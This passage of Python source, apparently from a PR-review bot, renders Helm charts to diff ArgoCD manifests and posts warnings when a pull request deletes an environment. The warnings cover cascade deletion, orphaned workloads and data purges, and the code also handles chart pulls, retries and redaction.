    return len(resources), kind_counts, sorted(workloads)


_CASCADE_KEEP_CRD_REASON = "CRD (shared with other environments)"
_CASCADE_KEEP_POLICY_REASON = "helm.sh/resource-policy: keep"
_CASCADE_KEEP_DELETE_FALSE_REASON = "sync-options: Delete=false"


def _cascade_retention_reason(type_key: str, doc_text) -> str:
    """Why ArgoCD's cascade delete SKIPS this resource, or "" if it deletes it.

    Mirrors shouldBeDeleted (controller/appcontroller.go), which is the only
    authority on what a cascade actually removes:

        !kube.IsCRD(obj) && !isSelfReferencedApp(app, kube.GetObjectRef(obj)) &&
        (deleteOption == nil || *deleteOption != synccommon.SyncValueFalse) &&
        !resourceutil.HasAnnotationOption(obj, helm.ResourcePolicyAnnotation,
                                          helm.ResourcePolicyKeep)

    The self-reference clause is about the Application object itself, which
    never appears in a rendered manifest, so only the other three apply here.

    doc_text is the rendered document. Anything that is not a string (older
    callers pass placeholder values) is treated as carrying no annotations,
    which errs towards counting a resource as deleted: overstating the
    destruction is the safe direction for a warning.
    """
    if type_key.split("/")[-1] == "CustomResourceDefinition":
        return _CASCADE_KEEP_CRD_REASON
    if not isinstance(doc_text, str):
        return ""
    for line in doc_text.splitlines():
        stripped = line.strip()
        if ":" not in stripped:
            continue
        key, value = stripped.split(":", 1)
        value = _strip_trailing_comment(value.strip()).strip("\"'")
        if key.strip() == "helm.sh/resource-policy" and value == "keep":
            return _CASCADE_KEEP_POLICY_REASON
        if key.strip() == "argocd.argoproj.io/sync-options" and "Delete=false" in value:
            return _CASCADE_KEEP_DELETE_FALSE_REASON
    return ""


def _split_resources_by_cascade_fate(resources: dict) -> tuple:
    """(deleted_subdict, {(type_key, reason): count}) for a cascade delete."""
    deleted, retained = {}, {}
    for key, doc in resources.items():
        reason = _cascade_retention_reason(key[0], doc)
        if reason:
            rk = (key[0], reason)
            retained[rk] = retained.get(rk, 0) + 1
        else:
            deleted[key] = doc
    return deleted, retained


def _decommission_cascades(identity_file: str, main_sha: str) -> bool:
    """True only when this environment opted into cascade deletion.

    COPS-2539: `appspace.decommission: true` in the environment's own
    customer.yaml templates ArgoCD's resources-finalizer onto its Applications,
    and that finalizer is what makes removing the folder actually delete the
    workloads. Without it, `preserveResourcesOnDeletion: true` on every
    ApplicationSet leaves them running.

    Fails CLOSED on any doubt (unreadable file, unparseable YAML, missing key):
    orphaning is the default everywhere, so an unknown must never render as the
    reassuring "it will all be cleaned up".
    """
    flat = _flat_yaml_cached(identity_file, main_sha)
    return str(flat.get("appspace.decommission", "")).lower() == "true"


def _decommission_purges_data(identity_file: str, main_sha: str) -> bool:
    """True only when the environment armed BOTH decommission flags.

    COPS-2572: `appspace.decommissionPurgeData` is inert on its own. The
    charts gate every purge resource on `and decommission decommissionPurgeData`
    so that a stray copy of the purge flag into an unarmed environment does
    nothing, and this must agree with them or the warning either cries wolf
    or stays quiet on a real data deletion.

    Fails CLOSED exactly like _decommission_cascades: anything other than a
    confident "true" on both means no purge is claimed.
    """
    flat = _flat_yaml_cached(identity_file, main_sha)
    return (str(flat.get("appspace.decommission", "")).lower() == "true"
            and str(flat.get("appspace.decommissionPurgeData", "")).lower() == "true")


def _decommission_fully_phased(identity_file: str, main_sha: str) -> bool:
    """True when a folder-deletion PR arrives properly phased, per
    acme-components documentation/delete.md (checked against the current
    default branch, automation-dev/2603.2.0):

      phase 2 — `appspace.decommission: true` live at base, so the
        cascade actually runs when the folder goes;
      phase 1 as applicable — when the identity file itself declares
        `appspace.infra.deployLinuxServicesK8s`, the VM deletion must be
        armed too (`defaults.allowDeletion: true`), or the real VM, disk
        and IP survive the cascade under the KCC/ASO abandon policy.

    This numbering is the canonical one and is what the rendered phase
    table uses (_decommission_phase_table). Phase 3 is the folder removal
    this function is judging.

    VMs declared only at cohort level are invisible here on purpose: this
    reads the same single file the cascade decision reads, and fails
    CLOSED on anything unreadable, exactly like _decommission_cascades.
    """
    if not _decommission_cascades(identity_file, main_sha):
        return False
    content, status = _bb_fetch_cached(identity_file, main_sha)
    if status != BB_OK or not content:
        return False
    try:
        flat = _flatten_yaml(yaml.safe_load(content) or {})
    except Exception:
        return False
    has_vms = any(k.startswith("appspace.infra.deployLinuxServicesK8s")
                  for k in flat)
    if not has_vms:
        return True
    val = flat.get("appspace.infra.deployLinuxServicesK8s.defaults.allowDeletion")
    return str(val).strip().lower() == "true"


def _evaluate_env_decommissions(candidates: list, pr_sha: str, main_sha: str,
                                 with_full_output: bool = False) -> tuple:
    """Build the decommission warning block for confirmed deletions.

    Confirms each candidate's identity file is genuinely gone at pr_sha
    before saying anything (defense in depth — never warn on a guess).
    Best-effort resource listing: a render failure does not suppress the
    warning, since the deletion itself is already confirmed fact.

    Returns (markdown_lines, env_names_reported). With with_full_output=True
    a third element is added: a "Full rendered output" appendix carrying the
    complete redacted manifests of everything the cascade removes, ONLY for
    deletions that are properly phased (_decommission_fully_phased) — an
    orphaning deletion removes nothing, so there is nothing to audit.
    """
    lines, envs_reported = [], []
    full_lines = []
    for c in candidates:
        _content, status = _bb_fetch_cached(c["identity_file"], pr_sha)
        if status != BB_NOT_FOUND:
            continue  # not actually deleted — do not warn on a false positive
        versions = sorted({
            _app_chart_revision_map[a] for a in c["apps"]
            if _app_chart_revision_map.get(a)
        })
        # Two tallies, because the answer depends on whether this
        # environment cascades. Orphaning leaves EVERYTHING running,
        # including the CRDs, so that branch must keep counting the lot.
        # A cascade skips whatever shouldBeDeleted excludes.
        all_total, all_kinds, all_workloads = 0, {}, set()
        del_total, del_kinds, del_workloads = 0, {}, set()
        retained_counts: dict = {}
        any_rendered = False
        # Read the base-side flags once, before the render loop: the cascade
        # decision drives which tally the panel shows, and (v2.26.0) whether
        # the full deleted manifests are collected for the audit appendix.
        cascade = _decommission_cascades(c["identity_file"], main_sha)
        purges_data = _decommission_purges_data(c["identity_file"], main_sha)
        # COPS-2616: the phase table needs the VM-arming state too. Same
        # single base-side file the cascade decision reads, and fails CLOSED
        # the same way, so an unreadable identity file renders Phase 1 as
        # pending rather than silently claiming it is done.
        vm_armed, declares_vms = False, False
        _vm_content, _vm_status = _bb_fetch_cached(c["identity_file"], main_sha)
        if _vm_status == BB_OK and _vm_content:
            try:
                _vm_flat = _flatten_yaml(yaml.safe_load(_vm_content) or {})
                vm_armed = _vm_deletion_armed_flat(_vm_flat)
                declares_vms = _declares_vms_flat(_vm_flat)
            except Exception:
                pass
        collect_full = (with_full_output and cascade
                        and _decommission_fully_phased(c["identity_file"], main_sha))
        app_deleted_docs: dict = {}
        for app in c["apps"]:
            try:
                resources = _render_main_side_resources(app, main_sha)
            except Exception as e:
                debug(f"decommission resource listing failed for {app}: {e}")
                continue
            any_rendered = True
            n, kc, wl = _summarize_resources_dict(resources)
            all_total += n
            for k, v in kc.items():
                all_kinds[k] = all_kinds.get(k, 0) + v
            all_workloads.update(wl)

            deleted_only, retained = _split_resources_by_cascade_fate(resources)
            if collect_full and deleted_only:
                app_deleted_docs[app] = deleted_only
            dn, dkc, dwl = _summarize_resources_dict(deleted_only)
            del_total += dn
            for k, v in dkc.items():
                del_kinds[k] = del_kinds.get(k, 0) + v
            del_workloads.update(dwl)
            for k, v in retained.items():
                retained_counts[k] = retained_counts.get(k, 0) + v

        # COPS-2565: does this environment actually cascade-delete its
        # resources? Every ApplicationSet sets preserveResourcesOnDeletion:
        # true, so removing an environment deletes the Application and LEAVES
        # THE WORKLOADS RUNNING, unless the COPS-2539 gate is opted into with
        # appspace.decommission: true, which templates ArgoCD's cascade
        # finalizer on. Read from the environment's own identity file at the
        # base sha, which is already fetched. Anything other than a confident
        # "true" is treated as orphaning: that is both the default and, as of
        # 2026-07-31, the only case that exists in any repo, so a wrong guess
        # must never be the reassuring one.
        total = del_total if cascade else all_total
        kind_counts = del_kinds if cascade else all_kinds
        workloads = del_workloads if cascade else all_workloads
        lines += [
            f"# \U0001f5d1\ufe0f\u26a0\ufe0f ENVIRONMENT DECOMMISSION \u26a0\ufe0f\U0001f5d1\ufe0f",
            "",
            f"**`{c['env_name']}` is being deleted by this PR "
            f"(was running chart version `{', '.join(versions) or 'unknown'}`). "
            f"This is a destructive, hard-to-reverse change — verify this is intentional.**",
            "",
        ] + _decommission_phase_table(
            # Position before volume: the reviewer sees where this PR sits in
            # the sequence before scrolling the inventory. A Phase 2 row that
            # is not done is also why the orphaning warning below fires
            # (COPS-2616).
            vm_state=(_PH_DONE if vm_armed else None),
            cascade_state=(_PH_DONE if cascade else None),
            removal_state=_PH_THIS_PR,
            declares_vms=declares_vms,
            purge=purges_data,
        ) + [
            "",
        ]
        if not cascade:
            lines += [
                "\u26a0\ufe0f **The ArgoCD Application is removed, but its resources "
                "are NOT deleted — they keep running.** This environment has not "
                "opted into cascade deletion, and the ApplicationSet sets "
                "`preserveResourcesOnDeletion: true`, so every workload below is "
                "left orphaned in the cluster: still running, still costing money, "
                "still holding IPs and disks, and no longer managed by ArgoCD.",
                "",
                "To delete them together with the Application, set "
                "`appspace.decommission: true` in the environment's `customer.yaml` "
                "and let it sync BEFORE the folder is removed (COPS-2539). "
                "Otherwise they have to be cleaned up by hand.",
                "",
            ]
        elif purges_data:
            # COPS-2572: both flags armed. This is the only state in which
            # customer data is destroyed, so it cannot read like the ordinary
            # destructive-but-recoverable case above.
            lines += [
                "\U0001f6a8 **DATA WILL BE PERMANENTLY DESTROYED.** This environment "
                + "also has `appspace.decommissionPurgeData: true`, so Config Connector "
                + "empties and deletes the BigQuery dataset and the user content bucket "
                + "as part of the cascade. **That data is not recoverable afterwards.** "
                + "Only the content backup bucket is deliberately left behind.",
                "",
            ]
        else:
            lines += [
                "\u2705 **Data is not purged.** The BigQuery dataset and the content "
                + "bucket are abandoned rather than deleted, so they survive in GCP and "
                + "stay recoverable. Destroying them needs `appspace.decommissionPurgeData: "
                + "true` as a separate, reviewed change (COPS-2572).",
                "",
            ]
        if any_rendered and total:
            # Top kinds only. The full breakdown was ~30 comma-separated
            # entries wrapping over eight lines in Bitbucket (seen live on
            # PR #3894) -- unreadable, and the exact tail never drove a
            # decision. The complete inventory is in the appendix on the
            # full-diff page.
            _ranked = sorted(kind_counts.items(), key=lambda kv: (-kv[1], kv[0]))
            kind_breakdown = ", ".join(f"{n} {k}" for k, n in _ranked[:8])
            if len(_ranked) > 8:
                kind_breakdown += (f", +{len(_ranked) - 8} more kind(s)")
            label = ("**Resources that will be removed:**" if cascade
                     else "**Resources that will be LEFT RUNNING (orphaned):**")
            lines.append(f"- {label} {total} total \u2014 {kind_breakdown}")
            if workloads:
                shown = sorted(workloads)[:DECOM_WORKLOADS_MAX_SHOWN]
                apps_str = ", ".join(f"`{w}`" for w in shown)
                more = (f" *(+{len(workloads) - DECOM_WORKLOADS_MAX_SHOWN} more, truncated)*"
                        if len(workloads) > DECOM_WORKLOADS_MAX_SHOWN else "")
                wl_label = ("**Applications removed:**" if cascade
                            else "**Workloads left running:**")
                lines.append(f"- {wl_label} {apps_str}{more}")
        if cascade and retained_counts:
            # Silently dropping these would be worse than the overcount they
            # replace: shared CRDs and a kept Namespace are exactly what got
            # left behind on the pv-qa-99-a pilot, and the Namespace surviving
            # is what kept 12 cloned secrets alive in it.
            retained_str = ", ".join(
                f"{n} {tk} ({reason})"
                for (tk, reason), n in sorted(retained_counts.items(),
                                              key=lambda kv: (-kv[1], kv[0])))
            lines.append(
                f"- **Retained (ArgoCD will NOT delete these):** {retained_str}")
        else:
            lines.append("- *(resource preview unavailable \u2014 the deletion itself is confirmed)*")
        lines.append("")
        envs_reported.append(c["env_name"])
        if collect_full and app_deleted_docs:
            parts = []
            for app in sorted(app_deleted_docs):
                docs = app_deleted_docs[app]
                body = "\n---\n".join(
                    d.strip("\n") for _k, d in sorted(docs.items()))
                parts.append(f"# \u2500\u2500 Application: {app} \u2500\u2500\n{body}")
            assembled = _redact_rendered_manifest("\n---\n".join(parts))
            n_docs = sum(len(v) for v in app_deleted_docs.values())
            full_lines += [
                "### \U0001f4c4 Full rendered output \u2014 everything that "
                "will be DELETED", "",
                f"Complete redacted manifests of every resource the cascade "
                f"removes for `{c['env_name']}`, rendered from `main` (the "
                f"state being deleted) and kept untruncated on the full-diff "
                f"page for audit. Shown because this deletion is properly "
                f"phased: the cascade was armed before this PR. Retained "
                f"resources are excluded on purpose \u2014 this is exactly "
                f"what goes away.", "",
                f"#### `{c['env_name']}` \u2014 {n_docs} resource(s) across "
                f"{len(app_deleted_docs)} application(s)", "",
                "```yaml",
                assembled,
                "```", "",
            ]
    if not with_full_output:
        return lines, envs_reported
    return lines, envs_reported, full_lines


def _apps_to_skip_for_decommission(candidates: list, confirmed_envs: list) -> set:
    """Apps belonging to a CONFIRMED decommissioned environment.

    v2.5.11 (live PR #6677): these apps must be excluded from the normal
    diff pipeline entirely — their identity file is confirmed gone, so a
    real render can never succeed. Left to run normally, they land as
    OUT_INDETERMINATE/render_failed: a RETRYABLE reason, so the PR is never
    marked "seen" and the pod re-diffs it forever, and the build status
    misleadingly says "will retry automatically" for something that is
    settled, confirmed fact, already fully explained by the decommission
    warning. Only candidates whose env_name is in confirmed_envs (i.e.
    _evaluate_env_decommissions actually verified the 404, not just a
    structural guess) are included — an unconfirmed candidate's apps must
    still go through the normal pipeline.
    """
    confirmed = set(confirmed_envs)
    return {a for c in candidates if c["env_name"] in confirmed for a in c["apps"]}


def _rebase_value_files(value_files: list, old_env_dir: str, new_env_dir: str) -> list:
    """Return value_files with the old env dir prefix replaced by the new one.

    Applied BEFORE path normalization on purpose: rebasing
    '<old>/../config.yaml' to '<new>/../config.yaml' makes the relative
    parent reference resolve to the NEW location's tier defaults — exactly
    what the ApplicationSet will generate after merge. Paths that do not
    start with the old env dir (absolute shared defaults like
    gcp/config.yaml) are returned unchanged.
    """
    rebased = []
    for vf in value_files:
        prefix = "$config/" if vf.startswith("$config/") else ""
        clean  = vf[len(prefix):].lstrip("/")
        if clean == old_env_dir or clean.startswith(old_env_dir + "/"):
            clean = new_env_dir + clean[len(old_env_dir):]
        rebased.append(prefix + clean)
    return rebased


def _effective_chart_version(ordered_value_files: list, vals: dict):
    """Effective appspace.version across ordered value files (last wins).

    Mirrors helm -f semantics: a later file overrides an earlier one. Files
    missing from vals (404s) are skipped. Returns None when no file sets
    appspace.version.
    """
    version = None
    for vf in ordered_value_files:
        content = vals.get(vf)
        if not content:
            continue
        v = _extract_chart_version(content)
        if v:
            version = v
    return version


def _parse_version_tuple(version: str):
    """Leading dotted-numeric part of a chart version as an int tuple.

    '2602.4.9-dev' -> (2602, 4, 9). Returns None when the version does not
    start with a number (unparseable — comparisons are skipped)."""
    if not version:
        return None
    mnum = re.match(r"^(\d+(?:\.\d+)*)", version.strip())
    if not mnum:
        return None
    return tuple(int(x) for x in mnum.group(1).split("."))


def _is_version_downgrade(current: str, new: str) -> bool:
    """True when `new` is a strictly LOWER chart version than `current`.

    v2.5.8: downgrades are legal but dangerous (schema regressions, data
    migrations that do not run backwards), so the PR comment must shout.
    Unparseable versions return False — never block on noise."""
    cur_t = _parse_version_tuple(current)
    new_t = _parse_version_tuple(new)
    if cur_t is None or new_t is None:
        return False
    # Pad to equal length so 2602.4 vs 2602.4.1 compares sanely.
    length = max(len(cur_t), len(new_t))
    cur_t += (0,) * (length - len(cur_t))
    new_t += (0,) * (length - len(new_t))
    return new_t < cur_t


def _run_one_diff(app, pr_sha, main_sha, chart_revision=None, changed_paths=None, renames=None):
    """Diff PR vs main using pure helm template — no ArgoCD agent access at all.

    Strategy:
      1. Resolve chart metadata from the in-memory app cache (populated at startup
         from `argocd app list`, refreshed every 5 min).
      2. Pull the OCI chart tarball for both the PR version and the current main
         version to the local HELM_CACHE_DIR (first pull only; reused thereafter).
      3. Fetch value files (Bitbucket API) at both PR sha and main sha.
      4. Run `helm template` for each set, diff the YAML output resource-by-resource.

    No `argocd app diff`, no `argocd app manifests`, no spoke-agent round-trips.

    Returns (diff_text, reason, detail):
      reason is None on success (diff_text is the diff, "" means identical).
      Otherwise reason is one of the REASON_* codes and detail is a short string.
      REASON_OCI_NOT_FOUND is permanent; the rest are transient/soft and the
      caller decides whether to retry (see RETRYABLE_REASONS).
    """
    chart_name  = _app_chart_map.get(app)
    main_rev    = _app_chart_revision_map.get(app)
    registry    = _app_chart_registry_map.get(app, "")
    value_files = _app_value_files_map.get(app, [])
    namespace   = _app_namespace_map.get(app, "")
    release     = app.split("/")[-1]   # strip "namespace/" prefix if present

    if not (chart_name and main_rev and value_files and registry):
        missing = [k for k, v in [("chart", chart_name), ("revision", main_rev),
                                   ("value_files", value_files), ("registry", registry)] if not v]
        return None, REASON_METADATA, (f"app metadata not yet in cache "
                                        f"({', '.join(missing)})")

    pr_rev = chart_revision or main_rev

    # v2.5.8 (T2b, live PR #6666): the env folder was MOVED in this PR. The
    # PR side must render with the NEW location's value-file chain, so the
    # relative parent refs (<env>/../config.yaml) resolve to the new
    # tier/region defaults — exactly what the ApplicationSet generates after
    # merge. The PR chart version must also come from that rebased chain
    # (last file wins, helm -f semantics): after a move the env's own
    # customer.yaml may no longer set appspace.version, deferring to a tier
    # default the old path-based detection could never see.
    env_move       = _detect_env_move(value_files, renames, main_sha, pr_sha)
    moved_pr_vals  = None
    pr_value_files = value_files
    if env_move:
        old_env_dir, new_env_dir = env_move
        pr_value_files = _rebase_value_files(value_files, old_env_dir, new_env_dir)
        log(f"  [{app}] env folder moved {old_env_dir} -> {new_env_dir}; "
            f"rendering PR side against the new location's value-file chain")
        try:
            moved_pr_vals = _fetch_value_files(pr_value_files, pr_sha)
        except Exception as e:
            return None, REASON_UNEXPECTED, f"value fetch after folder move failed: {str(e)[:150]}"
        if not moved_pr_vals:
            return None, REASON_RENDER, "no value files found at moved location"
        effective = _effective_chart_version(pr_value_files, moved_pr_vals)
        if effective:
            pr_rev = effective

    # Pull both chart versions in parallel (each is per-key locked to prevent
    # concurrent downloads of the same version).
    # v2.5.18 (FINDINGS_SCALE S3): this used to be `with ThreadPoolExecutor`.
    # On a result() timeout the exception left the `with` block, whose
    # __exit__ calls shutdown(wait=True) — silently blocking until BOTH
    # pulls actually finished (3 pull attempts x 120s subprocess timeout +
    # backoff sleeps + an unbounded per-key pull-lock wait): a diff that
    # "timed out at DIFF_TIMEOUT" really held its DIFF_WORKERS slot for
    # 6-7+ minutes, exactly when the registry was already degraded, and the
    # per-diff retries multiplied it. shutdown(wait=False,
    # cancel_futures=True) in the finally cancels anything still queued and
    # lets a running pull finish in the background (bounded by its own
    # subprocess timeouts) without holding this worker hostage; on the
    # success path both futures are already done, so it is a no-op.
    _pull_ex = ThreadPoolExecutor(max_workers=2)
    try:
        # COPS-2549: each side from the registry its own version lives in.
        pr_registry   = _registry_for_version(pr_rev)
        main_registry = _registry_for_version(main_rev)
        pr_fut   = _pull_ex.submit(_ensure_chart, pr_registry, chart_name, pr_rev)
        main_fut = _pull_ex.submit(_ensure_chart, main_registry, chart_name, main_rev)
        pr_chart   = pr_fut.result(timeout=DIFF_TIMEOUT)
        main_chart = main_fut.result(timeout=DIFF_TIMEOUT)
    except OciChartNotFound as e:
        return None, REASON_OCI_NOT_FOUND, str(e)
    except concurrent.futures.TimeoutError:
        return None, REASON_TIMEOUT, f"chart pull exceeded {DIFF_TIMEOUT}s"
    except Exception as e:
        # OciChartNotFound may arrive wrapped by the executor — unwrap it.
        cause = getattr(e, "__cause__", None) or getattr(e, "__context__", None)
        if isinstance(cause, OciChartNotFound) or isinstance(e, OciChartNotFound):
            return None, REASON_OCI_NOT_FOUND, str(cause or e)
        return None, REASON_OCI_PULL, str(e)[:200]
    finally:
        _pull_ex.shutdown(wait=False, cancel_futures=True)

    if not pr_chart:
        return None, REASON_OCI_PULL, f"helm pull failed for {chart_name}:{pr_rev}"
    if not main_chart:
        return None, REASON_OCI_PULL, f"helm pull failed for {chart_name}:{main_rev}"

    # v2.5.18 (FINDINGS_SCALE S4): every future this diff submits to the
    # SHARED subtask pool is tracked here and cancel()ed on every abnormal
    # exit. Before this, a timed-out diff abandoned its futures in the pool
    # (queued ones kept a slot, running ones kept a worker) and each of the
    # up-to-5 retries stacked more on top — classic congestion amplification
    # exactly when renders were already slow across a mass PR (3 PRs x 16
    # diff workers = 48 waiters on 32 pool workers). cancel() removes queued
    # work for free; running tasks are already bounded by their own
    # subprocess timeouts, and cancel() on a done future is a no-op.
    _diff_futs = []

    def _cancel_futs():
        # S4 helper + v2.5.19 M8 counter: cancel every abandoned shared-pool
        # future and record how many were actually still cancellable.
        n = sum(1 for _f in _diff_futs if _f.cancel())
        if n:
            with _diff_stats_lock:
                _diff_stats["futures_cancelled"] += n
    try:
        # Optimization: value files not changed in this PR are byte-identical at
        # pr_sha and main_sha. Fetch them only once (at main_sha) and reuse for
        # the PR side. Only files that appear in the PR's changed_paths need a
        # fresh fetch at pr_sha. This halves Bitbucket API calls for the common
        # case of a version-only bump where a single config.yaml changes.
        pool = _get_subtask_pool()
        main_vf_fut = pool.submit(_fetch_value_files, value_files, main_sha)
        _diff_futs.append(main_vf_fut)

        if moved_pr_vals is not None:
            # v2.5.8: env folder moved — PR-side values were already fetched
            # against the rebased (new-location) file chain above. Only the
            # main side (old paths, pre-merge reality) is fetched here.
            main_vals = main_vf_fut.result(timeout=DIFF_TIMEOUT)
            pr_vals   = moved_pr_vals
        elif changed_paths:
            # Split: files touched by this PR fetch fresh at pr_sha; others reuse.
            changed_clean = {
                posixpath.normpath(p.lstrip("/")) for p in changed_paths}
            pr_changed_vf = [
                vf for vf in value_files
                if posixpath.normpath(vf.replace("$config/", "").lstrip("/"))
                   in changed_clean
            ]
            unchanged_vf  = [vf for vf in value_files if vf not in pr_changed_vf]

            pr_changed_fut = pool.submit(_fetch_value_files, pr_changed_vf, pr_sha) \
                             if pr_changed_vf else None
            if pr_changed_fut is not None:
                _diff_futs.append(pr_changed_fut)

            main_vals = main_vf_fut.result(timeout=DIFF_TIMEOUT)

            # Build pr_vals preserving the ORIGINAL order from value_files.
            # dict.update() would append new keys at the end, breaking -f ordering
            # for files present in PR but absent in main (new environment files).
            pr_fresh = pr_changed_fut.result(timeout=DIFF_TIMEOUT) if pr_changed_fut else {}

            # v2.5.4 (Finding 6): a changed value file that 404s at pr_sha might
            # not be DELETED — it might have been RENAMED/MOVED within this PR
            # (renames carries the old->new pairing from the raw Bitbucket
            # diffstat). Resolve those up front, batched in one call, so
            # following a rename costs one extra round trip total for this
            # app, not one per renamed file. Confirmed live before this fix:
            # a pure folder rename made helm template fail entirely for that
            # customer (PRs #6647/#6648/#6649/#6654) because customer.yaml's
            # required values simply vanished from the render inputs.
            rename_targets = []
            if renames:
                trusted_dirs_vf = _trusted_rename_dirs(renames, main_sha, pr_sha)
                for vf in pr_changed_vf:
                    if vf in pr_fresh:
                        continue
                    cp = posixpath.normpath(vf.replace("$config/", "").lstrip("/"))
                    # v2.5.9: same corroboration requirement as
                    # _pr_chart_revision_checked — see _trusted_rename_dirs.
                    # v2.5.15: identity-file pairings are also content-verified.
                    if cp in renames and _is_trusted_rename(cp, renames[cp], trusted_dirs_vf, main_sha, pr_sha):
                        rename_targets.append(renames[cp])
            renamed_vals = _fetch_value_files(rename_targets, pr_sha) if rename_targets else {}

            pr_vals = {}
            # Track which vf paths were changed by this PR (normalized form)
            changed_vf_set = {
                posixpath.normpath(vf.replace("$config/", "").lstrip("/"))
                for vf in pr_changed_vf
            }
            for vf in value_files:
                clean_path = posixpath.normpath(vf.replace("$config/", "").lstrip("/"))
                if vf in pr_fresh:
                    # Changed file present at pr_sha — use fresh fetch
                    pr_vals[vf] = pr_fresh[vf]
                elif clean_path in changed_vf_set:
                    new_path = renames.get(clean_path) if renames else None
                    if new_path and new_path in renamed_vals:
                        # Renamed, not deleted: follow it to the new path so
                        # the overrides it carries (often appspace.version,
                        # every service tag for that customer) still apply.
                        pr_vals[vf] = renamed_vals[new_path]
                    # else: genuine deletion (or the new path 404s too, which
                    # would be unusual) — omit as before, reflects deletion.
                elif vf in main_vals:
                    # Unchanged file — reuse main sha content safely
                    pr_vals[vf] = main_vals[vf]
                # Files absent from both sides omitted (new path, 404 everywhere)
        else:
            # No changed_paths info — fall back to fetching both sides in full.
            pr_vf_fut = pool.submit(_fetch_value_files, value_files, pr_sha)
            _diff_futs.append(pr_vf_fut)
            main_vals = main_vf_fut.result(timeout=DIFF_TIMEOUT)
            pr_vals   = pr_vf_fut.result(timeout=DIFF_TIMEOUT)

        # Main-side render cache: reuse parsed resources if we already rendered
        # this app at main_sha (common when the same app appears in multiple PRs
        # or when a retry loop re-runs the diff).
        # Key includes the chart revision AND its pull generation: a dev tag
        # republished under the same version gets a new pull timestamp on
        # re-pull, which invalidates renders made from the previous build
        # even if the webhook-driven eviction was missed.
        main_pull_gen = _helm_chart_pull_ts.get(f"{registry}/{chart_name}:{main_rev}", 0)
        main_cache_key = (app, main_sha, main_rev, main_pull_gen)
        with _main_render_lock:
            main_resources = _main_render_cache.get(main_cache_key)
        needs_main_render = main_resources is None
        with _diff_stats_lock:
            _diff_stats["main_render_cache_misses" if needs_main_render
                        else "main_render_cache_hits"] += 1

        pool     = _get_subtask_pool()
        pr_fut   = pool.submit(_helm_template, pr_chart, release, namespace, pr_vals)
        _diff_futs.append(pr_fut)
        main_fut = pool.submit(_helm_template, main_chart, release, namespace, main_vals) \
                   if needs_main_render else None
        if main_fut is not None:
            _diff_futs.append(main_fut)

        pr_yaml, pr_err = pr_fut.result(timeout=DIFF_TIMEOUT)
        if pr_err:
            _cancel_futs()
            return None, _render_reason(pr_err), pr_err

        if needs_main_render:
            main_yaml, main_err = main_fut.result(timeout=DIFF_TIMEOUT)
            if main_err:
                return None, _render_reason(main_err), main_err
            main_resources = _parse_manifest_resources(main_yaml)
            with _main_render_lock:
                _main_render_cache[main_cache_key] = main_resources
                # Evict oldest half when cap exceeded (dict preserves insertion order)
                if len(_main_render_cache) > MAIN_RENDER_CACHE_MAX:
                    drop = len(_main_render_cache) - MAIN_RENDER_CACHE_MAX // 2
                    for k in list(_main_render_cache.keys())[:drop]:
                        del _main_render_cache[k]

    except (subprocess.TimeoutExpired, concurrent.futures.TimeoutError):
        _cancel_futs()   # S4: never leave zombies in the shared pool
        return None, REASON_TIMEOUT, f"render exceeded {DIFF_TIMEOUT}s"
    except Exception as e:
        _cancel_futs()   # S4: same rule for every abnormal exit
        return None, REASON_RENDER, str(e)[:200]

    pr_resources = _parse_manifest_resources(pr_yaml)
    # v2.5.8: report the effective chart-version change (if any) so the
    # comment can shout on downgrades. pr_rev is final here — including a
    # tier-default version discovered after a folder move.
    version_change = (main_rev, pr_rev) if pr_rev != main_rev else None
    return _diff_resources(main_resources, pr_resources), None, None, version_change


def _indeterminate(reason, detail):
    """Build an INDETERMINATE DiffResult (diff could not be computed)."""
    # v2.5.19 (R2): redact before storing — this .error is rendered into the
    # PR comment and the build status, and helm's YAML errors echo the
    # offending source line (secrets included).
    return DiffResult("", [], 0, False, _redact_error_detail(detail)[:400],
                      OUT_INDETERMINATE, reason)


# Retry budget for a single diff. During a mass version bump the hub is briefly
# saturated, so a transient 5xx/timeout on the first try is normal and clears
# within a few seconds once the chart cache warms. More attempts with growing
# backoff make the diff transparent to reviewers instead of "diff unavailable".
DIFF_RETRIES       = _env_int("DIFF_RETRIES", 5)   # total attempts per diff
DIFF_BACKOFF_BASE  = float(os.environ.get("DIFF_BACKOFF_BASE", "3"))   # seconds
DIFF_BACKOFF_CAP   = float(os.environ.get("DIFF_BACKOFF_CAP", "30"))   # seconds


def _diff_backoff(attempt):
    """Exponential backoff with full jitter for retry number `attempt` (0-based).

    attempt 0 -> ~3s, attempt 1 -> ~6s, attempt 2 -> ~12s ... capped, plus
    jitter so concurrent retries of many apps do not thunder back in lockstep
    against the repo-server / agent.
    """
    base = min(DIFF_BACKOFF_BASE * (2 ** attempt), DIFF_BACKOFF_CAP)
    return base + random.uniform(0, base * 0.5)


def argocd_diff(app, pr_sha, main_sha, chart_revision=None, changed_paths=None, renames=None):
    """Compute the manifest diff between PR sha and main sha for one app.

    Returns a DiffResult. Never raises.

    The diff is a pure local `helm pull` + `helm template` + Python YAML diff
    (see _run_one_diff). No live cluster / spoke-agent access, so each diff takes
    ~4-6s with a warm chart cache instead of 20-360s through the agents.

    Retry policy keys off the explicit reason code from _run_one_diff (not string
    matching on stderr): transient reasons (RETRYABLE_REASONS) are retried with
    exponential backoff + jitter; REASON_OCI_NOT_FOUND is permanent and blocks
    the PR; everything else surfaces as INDETERMINATE (diff unavailable, never a
    false "no changes" and never a hard error that fails the PR on a blip).
    """
    last_detail = ""
    last_reason = "retry_exhausted"
    last_attempt = DIFF_RETRIES - 1
    for attempt in range(DIFF_RETRIES):
        step = _run_one_diff(
            app, pr_sha, main_sha,
            chart_revision=chart_revision, changed_paths=changed_paths, renames=renames)
        # v2.5.8: success returns a 4-tuple with the version change; failure
        # paths keep returning 3-tuples.
        diff_text, reason, detail = step[0], step[1], step[2]
        version_change = step[3] if len(step) > 3 else None

        if reason is not None:
            last_detail, last_reason = detail or reason, reason
            debug(f"diff step failed: {reason}", app=app,
                  attempt=attempt + 1, detail=(detail or "")[:800])
            # Permanent: the chart version does not exist. Never retry; block PR.
            if reason in PERMANENT_REASONS:
                return _indeterminate(reason, detail or reason)
            # Transient: retry with backoff while attempts remain.
            if reason in RETRYABLE_REASONS and attempt < last_attempt:
                delay = _diff_backoff(attempt)
                with _diff_stats_lock:
                    _diff_stats["diff_retries"] += 1
                print(f"    [{app}] {reason} (attempt {attempt + 1}/{DIFF_RETRIES}), "
                      f"retrying in {delay:.0f}s: {(detail or '')[:80]}", flush=True)
                time.sleep(delay)
                continue
            # Non-retryable soft failure (e.g. render_failed) or retries spent.
            return _indeterminate(reason, detail or reason)

        # diff_text == "" means manifests are identical
        if not diff_text:
